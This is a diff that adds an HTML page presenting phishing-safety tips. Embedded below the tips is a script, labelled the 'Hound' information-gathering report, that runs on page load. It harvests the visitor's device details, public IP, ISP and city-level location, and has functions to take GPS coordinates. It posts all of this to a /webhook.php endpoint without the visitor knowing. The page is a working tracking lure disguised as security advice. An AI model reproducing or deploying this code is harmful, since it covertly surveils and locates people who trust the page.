@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Attack Safety Tips</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            overflow: hidden;
+        }
+        header {
+            background: #333;
+            color: #fff;
+            padding-top: 30px;
+            min-height: 70px;
+            border-bottom: #ccc 1px solid;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+        }
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+        ul li {
+            background: #fff;
+            margin: 10px 0;
+            padding: 15px;
+            border: #ccc 1px solid;
+        }
+        footer {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Phishing Attack Safety Tips</h1>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>To stay safe from phishing attacks:</h2>
+        <ul>
+            <li><strong>Be Cautious with Emails and Links:</strong> Don’t click on links or download attachments from unknown or unsolicited emails.</li>
+            <li><strong>Verify Sources:</strong> Confirm the authenticity of the sender before providing any sensitive information.</li>
+            <li><strong>Use Security Software:</strong> Keep your antivirus and anti-malware software updated.</li>
+            <li><strong>Enable Two-Factor Authentication (2FA):</strong> Adds an extra layer of security to your accounts.</li>
+            <li><strong>Educate Yourself:</strong> Stay informed about common phishing tactics and scams.</li>
+        </ul>
+    </div>
+
+    <script src=
+    "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+    <script>
+    var x = document.getElementById("techchip");
+    let datetime = new Date();
+    let localtime = String(datetime.toLocaleTimeString());
+    var targetinfo = ("Hound - Information Gathering Report\n------------------------------------\n\nDevice Information\n----------------------------\nUser Agent: " + navigator.userAgent + " \nPlatform: " + navigator.platform + " \nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRAM: " + navigator.deviceMemory + "\nCPU Cores: " + navigator.hardwareConcurrency + "\nScreen Width: " + screen.width + "\nScreen Height: " + screen.height + "\nLocal Time: " + localtime + "\nRefUrl: " + document.referrer + "\nOS CPU: " + navigator.oscpu +  "\n-------------------------\n");
+    const xhr = new XMLHttpRequest();
+        xhr.open("POST", "/webhook.php"); 
+        xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+        xhr.send(JSON.stringify(targetinfo));
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+      $("#tc").html(data.ip);
+      const xhr = new XMLHttpRequest();
+          xhr.open("POST", "/webhook.php");
+          xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          var getip = ("\nTarget IP Detail\n----------------\n"  + "IP: " + data.ip  + "\n---------------\n");
+          xhr.send(JSON.stringify(getip));
+    })
+    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,proxy,hosting,query", function(response) {
+      const xhr = new XMLHttpRequest();
+          xhr.open("POST", "/webhook.php");
+          xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          var locationdata = ("\nNetwork & ISP Information\n------------------------\nResponse Status: " + response.status + "\nContinent: " + response.continent + "\nContinentCode: " + response.continentcode + "\nCountry: " + response.country + "\nCountrycode: " + response.countrycode + "\nRegion name: "+ response.regionName + "\nRegion: " + response.region + "\nCity: " + response.city +  "\nDistrict: " + response.district + "\nZip: " + response.zip + "\nTime_zone: " + response.time_zone + "\nAS Name: " + response.as + "\nISP Info: " + response.isp + "\nReverse: " + response.reverse + "\nOffset: " + response.offset +  "\nCurrency: " + response.currency + "\nProxy: " + response.proxy + "\nLat: " + response.lat + "\nLong: " + response.lon + "\n-------------------\n")
+          xhr.send(JSON.stringify(locationdata));
+    })
+    function gpsLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(latlong, catchError);
+      } else { 
+        const xhr = new XMLHttpRequest();
+          xhr.open("POST", "/webhook.php");
+          xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          const perror1 = "\nTarget Browser is not supporting geolocation.\n"
+          xhr.send(JSON.stringify(perror1));
+      }
+    }
+    function latlong(position) {
+      var latlong = ("\nGPS Lat Long Information\n-----------------------\nLatitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nMap Location:  https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\nGoogle Earth:  https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude + "\n------------------\n");
+      const xhr = new XMLHttpRequest();
+          xhr.open("POST", "/webhook.php");
+          xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          xhr.send(JSON.stringify(latlong));
+    }
+    function catchError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", "/webhook.php");
+          xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          const perror1 = "\nUser denied the Geolocation permision.\n"
+          xhr.send(JSON.stringify(perror1));
+          break;
+        case error.POSITION_UNAVAILABLE:
+          const xhr1 = new XMLHttpRequest();
+          xhr1.open("POST", "/webhook.php");
+          xhr1.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          const perror2 = "\nLocatin Unavailable.\n"
+          xhr1.send(JSON.stringify(perror2));
+          break;
+        case error.TIMEOUT:
+          const xhr2 = new XMLHttpRequest();
+          xhr2.open("POST", "/webhook.php");
+          xhr2.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          const perror3 = "\nTimeout Error.\n"
+          xhr2.send(JSON.stringify(perror3));
+          break;
+        case error.UNKNOWN_ERROR:
+          const xhr3 = new XMLHttpRequest();
+          xhr3.open("POST", "/webhook.php");
+          xhr3.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+          const perror4 = "\nUnknown error\n"
+          xhr3.send(JSON.stringify(perror4));
+          break;
+      }
+    }
+    </script> 
+
+</body>
+</html>
